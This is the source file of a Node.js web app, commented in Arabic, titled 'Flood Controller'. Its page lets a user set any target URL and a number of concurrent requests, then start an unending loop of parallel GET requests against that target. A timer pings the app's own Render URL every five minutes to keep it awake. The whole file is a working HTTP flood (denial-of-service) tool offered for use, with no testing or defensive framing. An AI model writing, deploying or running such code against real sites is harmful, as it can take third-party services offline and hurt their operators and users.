// index.js
const express = require("express");
const axios = require("axios");
const http = require("http");

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// الإعدادات
let targetUrl = "https://get.example.com";
let concurrentRequests = 10; // عدد الطلبات في نفس اللحظة
let running = false;

// رابط الـ Render نفسه (self-ping)
const selfUrl = "https://noon-9v11.onrender.com/";

// عميل Keep-Alive
const keepAliveAgent = new http.Agent({ keepAlive: true });

// وظيفة إرسال طلب واحد
async function sendRequest(i) {
  try {
    await axios.get(targetUrl, { httpAgent: keepAliveAgent });
    console.log(`✅ Request ${i} sent`);
  } catch (err) {
    console.log(`❌ Request ${i} failed`);
  }
}

// لوب الإرسال
async function runFlood() {
  let counter = 0;
  while (running) {
    const promises = [];
    for (let i = 0; i < concurrentRequests; i++) {
      counter++;
      promises.push(sendRequest(counter));
    }
    await Promise.all(promises);
  }
}

// Self Ping كل 5 دقائق
setInterval(async () => {
  try {
    await axios.get(selfUrl, { httpAgent: keepAliveAgent });
    console.log("🔄 Self-ping sent to keep Render awake");
  } catch (err) {
    console.log("⚠️ Self-ping failed");
  }
}, 5 * 60 * 1000); // 5 دقائق

// صفحة التحكم
app.get("/", (req, res) => {
  res.send(`
    <html>
    <head>
      <title>Flood Control</title>
      <style>
        body { background: black; color: white; font-family: sans-serif; text-align:center; }
        input, button { padding: 10px; margin: 5px; font-size: 16px; }
      </style>
    </head>
    <body>
      <h1>Flood Controller</h1>
      <form method="POST" action="/config">
        <label>Target URL: </label>
        <input name="url" value="${targetUrl}" size="40"/><br>
        <label>Requests at once: </label>
        <input name="concurrent" value="${concurrentRequests}" type="number"/><br>
        <button type="submit">Update Config</button>
      </form>
      <br>
      <form method="POST" action="/start">
        <button type="submit">🚀 Start</button>
      </form>
      <form method="POST" action="/stop">
        <button type="submit">🛑 Stop</button>
      </form>
      <p>Status: ${running ? "🟢 Running" : "🔴 Stopped"}</p>
    </body>
    </html>
  `);
});

// تحديث الإعدادات
app.post("/config", (req, res) => {
  if (req.body.url) targetUrl = req.body.url;
  if (req.body.concurrent) concurrentRequests = parseInt(req.body.concurrent);
  res.redirect("/");
});

// بدء الإرسال
app.post("/start", (req, res) => {
  if (!running) {
    running = true;
    runFlood();
  }
  res.redirect("/");
});

// إيقاف الإرسال
app.post("/stop", (req, res) => {
  running = false;
  res.redirect("/");
});

const port = process.env.PORT || 10000;
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
